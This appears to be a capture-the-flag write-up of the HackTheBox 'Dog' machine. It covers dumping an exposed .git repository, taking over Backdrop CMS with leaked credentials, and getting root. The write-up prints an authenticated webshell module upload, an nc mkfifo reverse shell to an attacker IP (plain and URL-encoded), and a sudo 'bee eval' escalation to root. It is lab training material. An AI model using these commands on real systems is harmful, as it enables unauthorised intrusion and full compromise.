[Dog](https://www.hackthebox.com/machines/dog) machine on [HachTheBox](https://www.hackthebox.com/) is an easy-level machine. For the initial foothold, after first scanning the application it revelas it consists of a CMS with a repository accessible. Under that repository we can gather some information that gives us access as admin on the CMS. After that we can leverage CMS module upload to gain a reverse shell. From there privilege escalation is obtained after pivoting to a user which was reusing a password and was able to execute binary as sudo which had a command that allowed to run arbitrary PHP code and escalate to root.

## Info

## Port scanning

We begin by identifying the services exposed by the target host.

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/HTB]
â””â”€$ nmap -sC -sV dog.htb -T4

```

## Initial foothold

Previous scan showed that there is a public `.git` repository. We proceed to extract that using `git-dumper`:

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/HTB]
â””â”€$git clone https://github.com/arthaud/git-dumper.git
â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/HTB]
â””â”€$pip install -r requirements.txt
â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/HTB]
â””â”€$./git_dumper.py http://dog.htb/.git ../dog && cd ../dog
```

Searching on the extracted files we found a `root` user and its password on `settings.php`

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/HTB/dog]
â””â”€$cat settings.php 
<?php
/**
 * @file
 * Main Backdrop CMS configuration file.
 */

/**
 * Database configuration:
 *
 * Most sites can configure their database by entering the connection string
 * below. If using primary/replica databases or multiple connections, see the
 * advanced database documentation at
 * https://api.backdropcms.org/database-configuration
 */
$database = 'mysql://root:<REDACTED>@127.0.0.1/backdrop';
$database_prefix = '';

/**
 * Site configuration files location.
...
...
```

We test those credentials on login CMS portal but seems that they are not working

After some time continuing our search around extracted files we found `tiffany` user by searching for `dog.htb`

```bash
â”Œâ”€â”€(git-dumper)â”€(kaliã‰¿kali)-[~/Documents/HTB/dog/dog]
â””â”€$ grep -r "dog.htb" .                                
./.git/logs/HEAD:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000  commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
./.git/logs/refs/heads/master:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000     commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```

That user works and we get access to admin panel

![Admin panel](../assets/img/posts/2025-08-25-htb-writeup-dog/image-1.png)

We want to know which version this concrete Backgrop CMS is using to see if there's some known vulnerability, so we search by `VERSION'` on extracted files we found backdrop CMS version `1.27.1.`

```bash
â”Œâ”€â”€(git-dumper)â”€(kaliã‰¿kali)-[~/Documents/HTB/dog/dog]
â””â”€$ grep -ri "VERSION'" . 
...
./core/includes/bootstrap.inc:define('BACKDROP_VERSION', '1.27.1');
...
```

Searching for exploits for `Backdrop` we found one which can be useful for us as it is the same version and it is an authenticated RCE, which we can probably use as we now have a valid admin credentials.

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/HTB/dog]
â””â”€$ searchsploit "Backdrop"
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path

-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/HTB/dog]
â””â”€$ cp /usr/share/exploitdb/exploits/php/webapps/52021.py exploit.py
```

Executing the exploit we see that a `shell.zip` file is generated. After examining the exploit code it seems that it creates a `shell.php` file and uploads it as a module.
It can be leveraged to run commands by using `cmd` parameter.

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/HTB/dog]
â””â”€$ python3 exploit.py http://dog.htb/
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://dog.htb//admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://dog.htb//modules/shell/shell.php
```

The url reported by the exploit is not working fine. So place after some search we found that URL to upload modules is the following one `http://dog.htb/?q=admin/modules/install`

![alt text](../assets/img/posts/2025-08-25-htb-writeup-dog/image-2.png)

Uploading modules only supports `tar` files

![alt text](../assets/img/posts/2025-08-25-htb-writeup-dog/image-3.png)

Exploit also generated a `shell` folder, so we compress generated folder to `shell.tar` and we are going to use that

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/HTB/dog]
â””â”€$ tar -cvf shell.tar shell                                              
shell/
shell/shell.info
shell/shell.php
```

Uploading it shows a message indicating a successful installation

![alt text](../assets/img/posts/2025-08-25-htb-writeup-dog/image-4.png)

Then going to `http://dog.htb/modules/shell/shell.php?cmd=id` as the script mentioned we get code execution.

![alt text](../assets/img/posts/2025-08-25-htb-writeup-dog/image-5.png)

Now we try to get a reverse shell with the following payload URL-encoded

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.217 4444 >/tmp/f
```

`URL-Encoded` 

```bash
http://dog.htb/modules/shell/shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|sh%20-i%202%3E%261|nc%2010.10.14.217%204444%20%3E%2Ftmp%2Ff
```

After executing that URL on the browser we get reverse shell as `www-data`

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/HTB/dog]
â””â”€$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.217] from (UNKNOWN) [10.129.145.3] 50270
sh: 0: can't access tty; job control turned off
$ python --version
sh: 1: python: not found
$ python3 --version

$ python3 -c "import pty;pty.spawn('/bin/bash');"
www-data@dog:/var/www/html/modules/shell$ export TERM=xterm
export TERM=xterm
www-data@dog:/var/www/html/modules/shell$ stty rows 40 columns 120
```

After making a stable shell, checking home directory reveals two users: `jobert` and `johncusack`

```bash
www-data@dog:/var/www/html/modules/shell$ ls -la /home
ls -la /home
total 16
drwxr-xr-x  4 root       root       4096 Aug 15  2024 .
drwxr-xr-x 19 root       root       4096 Feb  7  2025 ..
drwxr-xr-x  4 jobert     jobert     4096 Feb  7  2025 jobert
drwxr-xr-x  3 johncusack johncusack 4096 Feb  7  2025 johncusack
```

Testing both users with previously found password we see it is has been reused for `johncusack` user as we get a successful login.
Under this user we found `user.txt` file:

```bash
www-data@dog:/var/www/html/modules/shell$ su johncusack
su johncusack
Password: <REDACTED>

johncusack@dog:/var/www/html/modules/shell$ whoami
whoami
johncusack
johncusack@dog:/var/www/html/modules/shell$ 
johncusack@dog:/var/www/html/modules/shell$ cd /home  
cd /home
johncusack@dog:/home$ cd johncusack
cd johncusack
johncusack@dog:~$ cat user.txt
cat user.txt
97<REDACTED>
```

## Privilege escalation

Executing `sudo -l` we found that this user can execute `bee` utility as sudo without password

```bash
johncusack@dog:~$ sudo -l
sudo -l
[sudo] password for johncusack: ...

Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
johncusack@dog:~$ /usr/local/bin/bee
/usr/local/bin/bee
```

Checking `bee` options there's one that allows us to execute arbitrary PHP code.

![alt text](../assets/img/posts/2025-08-25-htb-writeup-dog/image-6.png)

Using `eval` command we can execute PHP code to spawn a root shell via /bin/bash, sucessfully getting `root` user and its `root.txt` file

```bash
johncusack@dog:/var/www/html/modules/shell$ sudo bee eval 'system("/bin/bash");'
[sudo] password for johncusack: <REDACTED>

root@dog:/var/www/html# cat /root/root.txt
cat /root/root.txt
30<REDACTED>
```
